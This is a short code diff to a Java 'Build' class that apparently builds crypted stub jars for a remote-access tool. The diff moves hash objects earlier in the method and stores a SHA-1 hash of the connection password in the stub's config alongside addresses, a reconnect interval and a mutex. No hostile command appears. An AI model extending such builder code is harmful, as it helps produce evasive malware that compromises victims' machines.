@@ -66,6 +66,9 @@ public class Build {
 
 		File tempStubCleanJar = null;
 		File tempCryptedNotRunnableJar = null;
+		
+		Sha1 sha1 = new Sha1();
+		Md5 md5 = new Md5();
 
 		try {
 
@@ -116,7 +119,7 @@ public class Build {
 
 				config.put("addresses", addressString);
 				config.put("id", id);
-				config.put("pass", pass);
+				config.put("pass", sha1.hashToString(pass));
 				config.put("reconsec", reconSec);
 				config.put("name", name);
 				config.put("mutex", mutex);
@@ -340,9 +343,6 @@ public class Build {
 			}
 
 			long end = System.currentTimeMillis();
-
-			Md5 md5 = new Md5();
-			Sha1 sha1 = new Sha1();
 			
 			listener.reportProgress(95, "MD5 of file: " + md5.hash(file), BuildStatus.INFO);
 			listener.reportProgress(95, "SHA1 of file: " + sha1.hash(file), BuildStatus.INFO);
